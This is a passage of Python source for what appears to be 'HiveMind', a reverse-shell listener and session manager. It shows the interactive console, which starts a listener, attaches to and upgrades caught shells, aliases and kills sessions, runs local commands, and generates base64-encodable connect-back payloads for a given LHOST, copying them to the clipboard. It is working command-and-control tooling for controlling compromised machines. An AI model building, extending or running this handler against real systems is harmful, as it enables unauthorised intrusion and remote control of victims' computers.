            return None
    elif tokens and tokens[0].lower() in ["session", "kill", "upgrade", "raw", "alias"]:
        if current_token_index == 1:
            with lock:
                dynamic_options = list(map(str, sessions.keys())) + list(session_aliases.keys())
            options = [opt for opt in dynamic_options if opt.startswith(text)]
            if state < len(options):
                return options[state]
            return None
    else:
        options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
        if state < len(options):
            return options[state]
        return None

if readline is not None:
    readline.set_completer(completer)
    readline.parse_and_bind("tab: complete")
    readline.set_completer_delims(" \t\n")

# --- Command-Line Interface ---
def command_line():
    global listener_running, DEFAULT_PORT
    while True:
        try:
            cmd = input(colored("HiveMind > ", "cyan")).strip()
        except EOFError:
            break  # Exit on Ctrl+D
        lower_cmd = cmd.lower()
        parts = cmd.split()

        if lower_cmd == "sessions":
            list_sessions()

        elif lower_cmd == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            banner()

        elif lower_cmd.startswith("listen"):
            if listener_running:
                safe_print(colored("[-] Listener is already running.", "red"), flush=True)
                continue
            if len(parts) == 1:
                port = DEFAULT_PORT
            else:
                try:
                    port = int(parts[1])
                except ValueError:
                    safe_print(colored("[-] Invalid port number.", "red"), flush=True)
                    continue
                DEFAULT_PORT = port
            listener_ready.clear()
            listener_thread = threading.Thread(target=lambda: start_listener(port), daemon=True)
            listener_thread.start()
            if not listener_ready.wait(timeout=5):
                listener_running = False
                safe_print(colored("[-] Listener did not start. Check the port or permissions.", "red"), flush=True)

        elif lower_cmd == "stop listener":
            stop_listener()

        elif lower_cmd.startswith("session "):
            if len(parts) < 2:
                safe_print(colored("[-] Usage: session <id|alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            sid = resolve_session_identifier(identifier)
            if sid is None:
                safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
            else:
                interactive_shell(sid)

        elif lower_cmd.startswith("upgrade "):
            if len(parts) < 2:
                safe_print(colored("[-] Usage: upgrade <id|alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            sid = resolve_session_identifier(identifier)
            if sid is None:
                safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
            else:
                upgrade_session(sid)

        elif lower_cmd.startswith("raw "):
            if len(parts) < 2:
                safe_print(colored("[-] Usage: raw <id|alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            sid = resolve_session_identifier(identifier)
            if sid is None:
                safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
            else:
                safe_print(colored(f"[*] Attaching Session {sid} in raw mode...", "yellow"), flush=True)
                raw_attach_session(sid, auto_pty=False, remember=True)

        elif lower_cmd.startswith("alias "):
            if len(parts) != 3:
                safe_print(colored("[-] Usage: alias <id|alias> <new_alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            new_alias = parts[2]
            if new_alias.isdigit():
                safe_print(colored("[-] Alias cannot be only numbers because it would conflict with session IDs.", "red"), flush=True)
                continue
            sid = resolve_session_identifier(identifier)
            if sid is None:
                safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
            else:
                with lock:
                    if new_alias in session_aliases:
                        safe_print(colored(f"[-] Alias '{new_alias}' is already in use.", "red"), flush=True)
                    else:
                        session_aliases[new_alias] = sid
                        safe_print(colored(f"[*] Session {sid} now has alias '{new_alias}'.", "yellow"), flush=True)

        elif lower_cmd.startswith("kill "):
            if len(parts) != 2:
                safe_print(colored("[-] Usage: kill <id|alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            kill_session(identifier)

        elif lower_cmd == "cleanup":
            cleanup_sessions()

        elif lower_cmd.startswith("set payload"):
            if len(parts) < 4:
                safe_print(colored("[-] Usage: set payload <PayloadType> <LHOST> [base64]", "red"), flush=True)
                continue
            payload_type = parts[2]
            lhost = parts[3]
            encode = False
            if len(parts) > 4 and parts[4].lower() == "base64":
                encode = True
            generated = generate_payload(payload_type, lhost, encode)
            safe_print(colored("\n[+] Generated Payload:", "yellow"), flush=True)
            safe_print(generated + "\n", flush=True)
            if pyperclip is not None:
                try:
                    pyperclip.copy(generated)
                    safe_print(colored("[*] Payload copied to clipboard.", "green"), flush=True)
                except Exception as e:
                    safe_print(colored(f"[-] Could not copy payload to clipboard: {e}", "red"), flush=True)
            else:
                safe_print(colored("[*] pyperclip is not installed, so the payload was not copied to clipboard.", "yellow"), flush=True)

        elif lower_cmd == "show payloads":
            list_payloads()

        elif lower_cmd.startswith("cmd "):
            local_command = cmd[4:]
            try:
                result = subprocess.run(local_command, shell=True, capture_output=True, text=True)
                if result.stdout:
                    safe_print(result.stdout, flush=True)
                if result.stderr:
                    safe_print(result.stderr, flush=True)
            except Exception as e:
                safe_print(colored(f"[-] Error executing command: {e}", "red"), flush=True)

        elif lower_cmd == "exit":
            safe_print(colored("[*] Exiting HiveMind...", "yellow"), flush=True)
            with lock:
                active_session_ids = list(sessions.keys())
            for sid in active_session_ids:
                remove_session(sid)
            if listener_running or listener_socket is not None:
                stop_listener()
            break

        elif lower_cmd.startswith("help"):
            if lower_cmd == "help":
                show_help()
            elif len(parts) == 2 and parts[1].lower() == "raw":
                show_raw_help()
            elif len(parts) == 2 and parts[1].lower() == "upgrade":
                show_upgrade_help()
            else:
                safe_print(colored("[-] Usage: help [raw|upgrade]", "red"), flush=True)

        else:
            safe_print(colored("[-] Unknown command.", "red"), flush=True)

if __name__ == "__main__":
    banner()
    command_line()

